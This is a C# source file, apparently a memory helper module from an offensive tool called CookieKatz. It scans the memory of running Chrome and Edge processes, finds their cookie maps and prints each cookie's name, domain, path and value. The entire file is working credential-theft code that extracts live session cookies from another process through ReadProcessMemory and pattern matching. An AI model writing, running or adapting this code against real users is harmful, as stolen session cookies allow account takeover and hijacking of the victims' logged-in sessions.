// MemoryHelper.cs
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using CookieKatz.Structs;

namespace CookieKatz
{
    public static class MemoryHelper
    {
        public static void PatchPattern(byte[] pattern, byte[] baseAddrPattern, int offset)
        {
            int szAddr = IntPtr.Size - 1;
            for (int i = offset - 1; szAddr > 3; i--)
            {
                pattern[i] = baseAddrPattern[szAddr];
                szAddr--;
            }
        }

        public static bool FindLargestSection(IntPtr hProcess, ulong moduleAddr, out ulong resultAddress)
        {
            resultAddress = 0;
            ulong offset = moduleAddr;
            ulong largestRegion = 0;

            MEMORY_BASIC_INFORMATION64 memInfo;

            while (VirtualQueryEx(hProcess, (IntPtr)offset, out memInfo, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION64))) != 0)
            {
                if (memInfo.State == MEM_COMMIT && (memInfo.Protect & PAGE_READONLY) != 0 && memInfo.Type == MEM_IMAGE)
                {
                    if (memInfo.RegionSize > largestRegion)
                    {
                        largestRegion = memInfo.RegionSize;
                        resultAddress = (ulong)memInfo.BaseAddress;
                    }
                }
                offset += memInfo.RegionSize;
            }

            return largestRegion > 0;
        }

        public static bool FindPattern(IntPtr hProcess, byte[] pattern, ulong[] resultAddrs, out int foundCount)
        {
            foundCount = 0;
            SYSTEM_INFO sysInfo = new SYSTEM_INFO();
            GetSystemInfo(out sysInfo);

            ulong startAddress = (ulong)sysInfo.MinimumApplicationAddress;
            ulong endAddress = (ulong)sysInfo.MaximumApplicationAddress;

            MEMORY_BASIC_INFORMATION64 memInfo;

            while (startAddress < endAddress)
            {
                if (VirtualQueryEx(hProcess, (IntPtr)startAddress, out memInfo, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION64))) == 0)
                    break;

                if (memInfo.State == MEM_COMMIT && (memInfo.Protect & PAGE_READWRITE) != 0 && memInfo.Type == MEM_PRIVATE)
                {
                    IntPtr p;
                    byte[] buffer = new byte[memInfo.RegionSize];
                    if (ReadProcessMemory(hProcess, (IntPtr)startAddress, buffer, (int)memInfo.RegionSize, out p))
                    {
                        for (int i = 0; i <= buffer.Length - pattern.Length; i++)
                        {
                            if (IsMatch(buffer, i, pattern))
                            {
                                resultAddrs[foundCount++] = startAddress + (ulong)i;
                                if (foundCount >= resultAddrs.Length)
                                    return true;
                            }
                        }
                    }
                }

                startAddress += memInfo.RegionSize;
            }

            return foundCount > 0;
        }

        private static bool IsMatch(byte[] data, int index, byte[] pattern)
        {
            for (int i = 0; i < pattern.Length; i++)
            {
                if (pattern[i] != 0xAA && pattern[i] != data[index + i])
                    return false;
            }
            return true;
        }

        public static void WalkCookieMap(IntPtr hProcess, ulong mapAddress, TargetVersion targetConfig)
        {
            RootNode root = ReadStruct<RootNode>(hProcess, mapAddress);
            Helper.Print($"[*] Number of available cookies: {root.size}\n");

            if (root.firstNode == 0 || root.size == UIntPtr.Zero)
            {
                Helper.Print("[*] This Cookie map was empty\n");
                return;
            }

            ProcessNode(hProcess, root.firstNode, targetConfig);
        }

        private static void ProcessNode(IntPtr hProcess, ulong nodeAddress, TargetVersion targetConfig)
        {
            Node node = ReadStruct<Node>(hProcess, nodeAddress);

            Helper.Print("Cookie Name: ");
            ReadString(hProcess, node.key);

            if (node.valueAddress != 0)
            {
                switch (targetConfig)
                {
                    case TargetVersion.Chrome:
                    case TargetVersion.Chrome130:
                    case TargetVersion.Chrome124:
                        var cookie = ReadStruct<CanonicalCookieChrome130>(hProcess, node.valueAddress);
                        PrintCookie(hProcess, cookie.name, cookie.value, cookie.domain, cookie.path);
                        break;
                    case TargetVersion.Edge130:
                        var edgeCookie = ReadStruct<CanonicalCookieEdge130>(hProcess, node.valueAddress);
                        PrintCookie(hProcess, edgeCookie.name, edgeCookie.value, edgeCookie.domain, edgeCookie.path);
                        break;
                    default:
                        Helper.Print("[!] Unsupported TargetVersion for value read\n");
                        break;
                }
            }

            if (node.left != 0)
                ProcessNode(hProcess, node.left, targetConfig);
            if (node.right != 0)
                ProcessNode(hProcess, node.right, targetConfig);
        }

        private static void PrintCookie(IntPtr hProcess, OptimizedString name, OptimizedString value, OptimizedString domain, OptimizedString path)
        {
            Helper.Print("  Domain: ");
            ReadString(hProcess, domain);
            Helper.Print("  Path: ");
            ReadString(hProcess, path);
            Helper.Print("  Value: ");
            ReadString(hProcess, value);
            Helper.Print("-------------------------\n");
        }

        private static void ReadString(IntPtr hProcess, OptimizedString str)
        {
            if (str.len <= 23)
            {
                string val = Encoding.UTF8.GetString(str.buf, 0, str.len);
                Helper.Print(val + "\n");
            }
            else
            {
                ulong addr = BitConverter.ToUInt64(str.buf, 0);
                byte[] buffer = new byte[str.len + 1];
                IntPtr pa;
                if (ReadProcessMemory(hProcess, (IntPtr)addr, buffer, buffer.Length, out pa))
                {
                    string val = Encoding.UTF8.GetString(buffer).TrimEnd('\0');
                    Helper.Print(val + "\n");
                }
                else
                {
                    Helper.Print("[!] Failed to read long OptimizedString\n");
                }
            }
        }

        private static T ReadStruct<T>(IntPtr hProcess, ulong address) where T : struct
        {
            int size = Marshal.SizeOf(typeof(T));
            byte[] buffer = new byte[size];
            IntPtr tem;
            if (ReadProcessMemory(hProcess, (IntPtr)address, buffer, size, out tem))
            {
                GCHandle handle = GCHandle.Alloc(buffer, GCHandleType.Pinned);
                T result =(T) Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
                handle.Free();
                return result;
            }
            else
            {
                Helper.Print("[!] Failed to read structure\n");
                return default(T); 
            }
        }

        #region WinAPI & Structs

        private const uint PAGE_READONLY = 0x02;
        private const uint PAGE_READWRITE = 0x04;
        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_PRIVATE = 0x20000;
        private const uint MEM_IMAGE = 0x1000000;

        [StructLayout(LayoutKind.Sequential)]
        private struct MEMORY_BASIC_INFORMATION64
        {
            public ulong BaseAddress;
            public ulong AllocationBase;
            public uint AllocationProtect;
            public ulong RegionSize;
            public uint State;
            public uint Protect;
            public uint Type;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct SYSTEM_INFO
        {
            public ushort processorArchitecture;
            public ushort reserved;
            public uint pageSize;
            public IntPtr MinimumApplicationAddress;
            public IntPtr MaximumApplicationAddress;
            public IntPtr activeProcessorMask;
            public uint numberOfProcessors;
            public uint processorType;
            public uint allocationGranularity;
            public ushort processorLevel;
            public ushort processorRevision;
        }

        [DllImport("kernel32.dll")]
        private static extern void GetSystemInfo(out SYSTEM_INFO lpSystemInfo);

        [DllImport("kernel32.dll")]
        private static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION64 lpBuffer, uint dwLength);

        [DllImport("kernel32.dll")]
        private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        #endregion
    }
}
